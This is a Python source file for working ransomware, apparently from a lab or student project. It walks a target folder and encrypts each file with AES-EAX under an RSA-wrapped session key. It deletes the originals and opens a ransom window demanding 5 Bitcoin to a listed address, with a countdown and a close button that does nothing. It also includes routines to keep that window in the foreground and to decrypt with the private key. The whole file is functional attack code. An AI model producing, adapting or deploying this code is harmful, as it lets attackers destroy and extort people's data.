###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

import base64
import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import tkinter as tk
from functools import partial
from threading import Thread
from ewmh import EWMH
import subprocess
from PIL import ImageTk, Image

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################

ENCRYPT_FOLDER_PATH = '/home/victim/Desktop/TestFolder/'  # CHANGE THIS
EXCLUDED_EXTENSIONS = ['.py', '.pem', '.exe']  # CHANGE THIS
RANWOMWARE_WINDOW_NAME = 'GЯ0up7 Ransomware'  # CHANGE THIS

###########################################################################################################################

with open('./media/public.pem', 'rb') as f:
    public = f.read()
# print(base64.b64encode(public))

# public key with base64 encoding
pubKey = base64.b64encode(public)
pubKey = base64.b64decode(pubKey)

###########################################################################################################################

class GUI(Thread):
    def __init__(self):
        # Initialize the Thread part of the GUI object, so we can use its functions and attributes
        Thread.__init__(self)
        # Kill the thread when the main thread finishes
        self.daemon = True

    # Overwrite the run() method from thread. This code will be executed when using GUI.start()
    def run(self):
        self.root = tk.Tk()
        def disable_event(): pass
        self.root.protocol("WM_DELETE_WINDOW", disable_event)
        self.root.title(RANWOMWARE_WINDOW_NAME)
        self.root.geometry('700x500')
        self.root.resizable(False, False)

        logo_image = Image.open("./utils/logo.jpeg")
        logo_image_resized = logo_image.resize((200, 200))
        img = ImageTk.PhotoImage(logo_image_resized)
        label2 = tk.Label(image=img)
        label2.pack(padx=10, pady=10)

        label3 = tk.Label(self.root, text="Hacked by GЯ0up7")
        label3.pack(padx=10, pady=10)

        self.label = tk.Label(self.root,font=('calibri', 40,'bold'))
        self.label.pack()

        label1 = tk.Label(self.root, text='All your files have been encrypted!\n Please send us 5 Bitcoin to this address:\n\nmkHS9ne12qx9pS9VojpwU5xtRd4T7X7ZUt\n', font=('calibri', 12,'normal'))
        label1.pack()
        
        
        decrypt_button = tk.Button(self.root, text='Decrypt', width=20, height=10, command=self.decryption_traversal)
        # decrypt_button = tk.Button(self.root, text='Decrypt', command=lambda: decryption_traversal(self.root))
        decrypt_button.pack(padx=10, pady=10)

        # call countdown first time
        self.countdown('23:59:59')

        # Thread(target=keep_active_window, daemon=True).start()

        self.root.mainloop()

    def countdown(self, count):
        # change text in label
        # count = '01:30:00'
        hour, minute, second = count.split(':')
        hour = int(hour)
        minute = int(minute)
        second = int(second)

        self.label['text'] = '{}:{}:{}'.format(hour, minute, second)

        if second > 0 or minute > 0 or hour > 0:
            # call countdown again after 1000ms (1s)
            if second > 0:
                second -= 1
            elif minute > 0:
                minute -= 1
                second = 59
            elif hour > 0:
                hour -= 1
                minute = 59
                second = 59
            self.root.after(1000, self.countdown, '{}:{}:{}'.format(hour, minute, second))

    def decryption_traversal(self):
        if not os.path.exists('./media/private.pem'): return

        for item in scanRecurse(ENCRYPT_FOLDER_PATH):
            filePath = Path(item)
            fileType = filePath.suffix.lower()

            if fileType in EXCLUDED_EXTENSIONS: continue
            decrypt(str(filePath), './media/private.pem')

        self.root.destroy()

###########################################################################################################################

def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)

def decrypt(dataFile, privateKeyFile):

    # read private key from file
    with open(privateKeyFile, 'rb') as f:
        privateKey = f.read()
        # create private key object
        key = RSA.import_key(privateKey)

    # read data from file
    with open(dataFile, 'rb') as f:
        # read the session key
        encryptedSessionKey, nonce, tag, ciphertext = [ f.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]

    # decrypt the session key
    cipher = PKCS1_OAEP.new(key)
    sessionKey = cipher.decrypt(encryptedSessionKey)

    # decrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)

    # save the decrypted data to file
    decryptedFile = dataFile.replace('.GЯ0up7', '')
    with open(decryptedFile, 'wb') as f:
        f.write(data)

    print('Decrypted file saved to ' + decryptedFile)
    os.remove(dataFile)
    
def encrypt(dataFile, publicKey):
    '''
    Input: path to file to encrypt, public key
    Output: encrypted file with extension .L0v3sh3 and remove original file
    use EAX mode to allow detection of unauthorized modifications
    '''
    # read data from file
    extension = dataFile.suffix.lower()
    print(extension)
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()

    # convert data to bytes
    data = bytes(data)

    # create public key object
    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)

    # encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # save the encrypted data to file
    encryptedFile = dataFile + '.GЯ0up7'
    with open(encryptedFile, 'wb') as f:
        [f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
    os.remove(dataFile)

def encryption_traversal():
    for item in scanRecurse(ENCRYPT_FOLDER_PATH):
        filePath = Path(item)
        fileType = filePath.suffix.lower()

        if fileType in EXCLUDED_EXTENSIONS: continue
        encrypt(filePath, pubKey)

###########################################################################################################################

def keep_active_window():
    while True:
        ewmh = EWMH()

        windows_list = ewmh.getClientList()

        active_window_name = ewmh.getActiveWindow()

        if type(active_window_name) != type(None) and active_window_name.get_wm_name() != RANWOMWARE_WINDOW_NAME:
            # Go to the desktop minimizing all the windows one by one
            for window in windows_list: 
                ewmh.setWmState(window, 1, '_NET_WM_STATE_SHADED') 
                ewmh.display.flush()

        target_window = None
        for window in windows_list:
            if window.get_wm_name() == RANWOMWARE_WINDOW_NAME:
                target_window = window
                break

        # Check if the target window was found
        if target_window:
            # Set the target window as the active window
            ewmh.setActiveWindow(target_window)
            ewmh.display.flush()

        ewmh.display.close()

###########################################################################################################################

my_GUI = GUI()

# Deploys the ransomware
def encrypt_ransomware():
    global my_GUI

    encryption_traversal()

    my_GUI.start()

    return

# Deploys the ransomware
def decrypt_ransomware():

    my_GUI.decryption_traversal()

    return

###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################

def run():
    success = False
    print("[+] Ransomware module activated!")
    # code ...
    success = True
    return success

if __name__ == "__main__":
    from time import sleep
    encrypt_ransomware()
    sleep(10)
    decrypt_ransomware()
    # Uncomment to check if Tkinter can run on a different thread without freezing
    # for i in range(1000000): print(i)
